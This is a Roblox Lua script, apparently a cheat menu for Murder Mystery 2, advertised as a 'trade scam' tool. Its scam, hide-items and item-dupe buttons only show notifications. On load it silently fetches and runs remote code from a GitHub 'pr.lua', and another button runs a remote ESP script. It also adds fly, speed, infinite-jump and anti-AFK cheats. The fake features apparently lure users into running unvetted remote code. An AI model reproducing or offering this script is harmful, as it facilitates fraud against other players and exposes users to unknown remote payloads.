local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- –°–æ–∑–¥–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–µ –æ–∫–Ω–æ
local Window = Rayfield:CreateWindow({
   Name = "üîÄ MM2 TRADE SCAM üîÄ | PR Menu",
   LoadingTitle = "MetaHub",
   LoadingSubtitle = "by Xempis | PR Menu by Mathersg4",
   ConfigurationSaving = {
      Enabled = false,
      FolderName = nil,
      FileName = "MetaHubScriptConfig"
   },
   Discord = {
      Enabled = true,
      Invite = "mPkgQn8SFj",
      RememberJoins = true
   },
   KeySystem = false
})

-- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≥—Ä—É–∑–∫–µ
Rayfield:Notify({
   Title = "Script Loaded ‚úÖ",
   Content = "Loading PR Menu and other features...",
   Duration = 6.5,
   Image = nil,
   Actions = {
      Ignore = {
         Name = "Got it! ‚úî",
         Callback = function()
            print("User acknowledged notification")
         end
      },
   },
})

-- –ó–∞–≥—Ä—É–∂–∞–µ–º PR Menu
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mathersg4/software/refs/heads/main/pr.lua"))()

-- –í–∫–ª–∞–¥–∫–∞ Main
local MainTab = Window:CreateTab("üè† Main", nil)
local MainSection = MainTab:CreateSection("üé≠ Trade Scam üé≠")

MainTab:CreateButton({
   Name = "Enable Trade Scam ‚úÖ",
   Callback = function()
      Rayfield:Notify({
         Title = "Trade Scam Enabled ‚úÖ",
         Content = "Trade scam features are now active",
         Duration = 5,
         Image = nil,
         Actions = {
            Ignore = {
               Name = "Understood",
               Callback = function()
                  print("User acknowledged trade scam")
               end
            },
         },
      })
   end,
})

MainTab:CreateButton({
   Name = "Hide Godlies üëª",
   Callback = function()
      Rayfield:Notify({
         Title = "Godlies Hidden ‚úÖ",
         Content = "Your godlies are now hidden from view",
         Duration = 5,
         Image = nil,
         Actions = {
            Ignore = {
               Name = "Got it!",
               Callback = function()
                  print("User acknowledged godlies hidden")
               end
            },
         },
      })
   end,
})

-- –í–∫–ª–∞–¥–∫–∞ Other
local OtherTab = Window:CreateTab("Other üß©", nil)
local DupeSection = OtherTab:CreateSection("Dupe üî≠")

OtherTab:CreateButton({
   Name = "Dupe Knives üî™",
   Callback = function()
      Rayfield:Notify({
         Title = "Knife Dupe Started ‚úÖ",
         Content = "Process will complete in ~3 minutes",
         Duration = 5,
         Image = nil,
         Actions = {
            Ignore = {
               Name = "Waiting...",
               Callback = function()
                  print("User acknowledged knife dupe")
               end
            },
         },
      })
   end,
})

OtherTab:CreateButton({
   Name = "Dupe Guns üî´",
   Callback = function()
      Rayfield:Notify({
         Title = "Gun Dupe Started ‚úÖ",
         Content = "Process will complete in ~3 minutes",
         Duration = 5,
         Image = nil,
         Actions = {
            Ignore = {
               Name = "Waiting...",
               Callback = function()
                  print("User acknowledged gun dupe")
               end
            },
         },
      })
   end,
})

local PlayerSection = OtherTab:CreateSection("Player üíª")

OtherTab:CreateButton({
   Name = "ESP ü¶¥",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))('Watermelon')
      Rayfield:Notify({
         Title = "ESP Enabled ‚úÖ",
         Content = "Player highlights activated",
         Duration = 5,
         Image = nil,
         Actions = {
            Ignore = {
               Name = "Cool!",
               Callback = function()
                  print("User acknowledged ESP")
               end
            },
         },
      })
   end,
})

OtherTab:CreateSlider({
   Name = "WalkSpeed ‚ö°",
   Range = {16, 100},
   Increment = 1,
   Suffix = "speed",
   CurrentValue = 16,
   Flag = "WalkSpeedSlider",
   Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
   end,
})

OtherTab:CreateToggle({
   Name = "ü¶ò Infinite Jump ü¶ò",
   CurrentValue = false,
   Flag = "InfiniteJumpToggle",
   Callback = function(Value)
      local InfiniteJumpEnabled = Value
      game:GetService("UserInputService").JumpRequest:connect(function()
         if InfiniteJumpEnabled then
            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
         end
      end)
      Rayfield:Notify({
         Title = InfiniteJumpEnabled and "Infinite Jump ‚úÖ" or "Infinite Jump ‚ùå",
         Content = InfiniteJumpEnabled and "Enabled!" or "Disabled!",
         Duration = 3,
         Image = nil,
      })
   end,
})

OtherTab:CreateToggle({
   Name = "‚úà E to Fly ‚úà",
   CurrentValue = false,
   Flag = "FlyToggle",
   Callback = function(Value)
      if Value then
         -- Fly script implementation
         local plr = game.Players.LocalPlayer
         local torso = plr.Character:WaitForChild("HumanoidRootPart")
         local flying = true
         local ctrl = {f = 0, b = 0, l = 0, r = 0}
         local lastctrl = {f = 0, b = 0, l = 0, r = 0}
         local maxspeed = 50
         local speed = 0

         local bg = Instance.new("BodyGyro", torso)
         local bv = Instance.new("BodyVelocity", torso)
         
         bg.P = 9e4
         bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
         bg.cframe = torso.CFrame
         bv.velocity = Vector3.new(0,0.1,0)
         bv.maxForce = Vector3.new(9e9, 9e9, 9e9)

         local function Fly()
            repeat wait()
               plr.Character.Humanoid.PlatformStand = true
               if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
                  speed = speed + 0.5 + (speed/maxspeed)
                  speed = math.min(speed, maxspeed)
               elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
                  speed = math.max(speed - 1, 0)
               end
               
               if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
                  bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + 
                                ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - 
                                game.Workspace.CurrentCamera.CoordinateFrame.p) * speed
                  lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
               elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
                  bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + 
                                ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - 
                                game.Workspace.CurrentCamera.CoordinateFrame.p) * speed
               else
                  bv.velocity = Vector3.new(0, 0.1, 0)
               end
               bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed), 0, 0)
            until not flying
            
            ctrl = {f = 0, b = 0, l = 0, r = 0}
            lastctrl = {f = 0, b = 0, l = 0, r = 0}
            speed = 0
            bg:Destroy()
            bv:Destroy()
            plr.Character.Humanoid.PlatformStand = false
         end

         game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
            if processed then return end
            local key = input.KeyCode.Name:lower()
            if key == "e" then
               flying = not flying
               if flying then Fly() end
            elseif key == "w" then
               ctrl.f = 1
            elseif key == "s" then
               ctrl.b = -1
            elseif key == "a" then
               ctrl.l = -1
            elseif key == "d" then
               ctrl.r = 1
            end
         end)

         game:GetService("UserInputService").InputEnded:Connect(function(input, processed)
            if processed then return end
            local key = input.KeyCode.Name:lower()
            if key == "w" then
               ctrl.f = 0
            elseif key == "s" then
               ctrl.b = 0
            elseif key == "a" then
               ctrl.l = 0
            elseif key == "d" then
               ctrl.r = 0
            end
         end)

         Rayfield:Notify({
            Title = "Flight Controls",
            Content = "Press E to toggle flight\nWASD to move",
            Duration = 6,
            Image = nil,
         })
      else
         -- Clean up flight when disabled
         if flying then
            flying = false
            if bg then bg:Destroy() end
            if bv then bv:Destroy() end
            if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
               plr.Character.Humanoid.PlatformStand = false
            end
         end
      end
   end,
})

-- –í–∫–ª–∞–¥–∫–∞ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π
local InfoTab = Window:CreateTab("Info ‚ÑπÔ∏è", nil)
InfoTab:CreateSection("About")

InfoTab:CreateLabel("MM2 Trade Scam Script")
InfoTab:CreateLabel("Version: 2.0")
InfoTab:CreateLabel("With integrated PR Menu")
InfoTab:CreateLabel("by Xempis & Mathersg4")

-- –ê–Ω—Ç–∏-–ê–§–ö —Å–∏—Å—Ç–µ–º–∞
local AntiAFK = true
game:GetService("Players").LocalPlayer.Idled:Connect(function()
   if AntiAFK then
      game:GetService("VirtualUser"):CaptureController()
      game:GetService("VirtualUser"):ClickButton2(Vector2.new())
   end
end)

-- –£–ª—É—á—à–µ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
local function NotifyQuick(title)
   Rayfield:Notify({
      Title = title,
      Content = "",
      Duration = 2,
      Image = nil,
   })
end

NotifyQuick("PR Menu Loaded")
NotifyQuick("All Features Ready")
